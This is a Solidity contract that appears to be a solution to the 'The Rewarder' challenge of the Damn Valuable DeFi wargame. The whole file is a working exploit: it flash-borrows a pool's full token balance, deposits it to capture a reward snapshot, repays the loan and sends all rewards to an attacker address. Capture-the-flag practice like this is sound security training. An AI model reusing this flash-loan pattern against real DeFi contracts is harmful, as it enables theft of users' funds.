pragma solidity 0.8.12;

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {TheRewarderPool} from "../../../src/Contracts/the-rewarder/TheRewarderPool.sol";
import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";


contract DrainContract {
        
    IERC20 public immutable dvt;
    IERC20 public immutable rewardToken;
    FlashLoanerPool public immutable flashLoanerPool;
    TheRewarderPool public immutable theRewarderPool;
    address attacker;


    constructor(
        address _attacker, 
        address tokenAddress, 
        address flashLoanerAddress, 
        address theRewarderAddress
    ){
        dvt = IERC20(tokenAddress);
        flashLoanerPool = FlashLoanerPool(flashLoanerAddress);
        theRewarderPool = TheRewarderPool(theRewarderAddress);
        rewardToken = IERC20(address(theRewarderPool.rewardToken()));
        attacker = _attacker;
    }

    function drainReward() public {
        flashLoanerPool.flashLoan(dvt.balanceOf(address(flashLoanerPool)));
    }


    function receiveFlashLoan(uint256 _amount) public {
        dvt.approve(address(theRewarderPool), _amount);
        theRewarderPool.deposit(_amount);
        theRewarderPool.distributeRewards();
        theRewarderPool.withdraw(_amount);
        dvt.transfer(address(flashLoanerPool), _amount);

        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
    }
}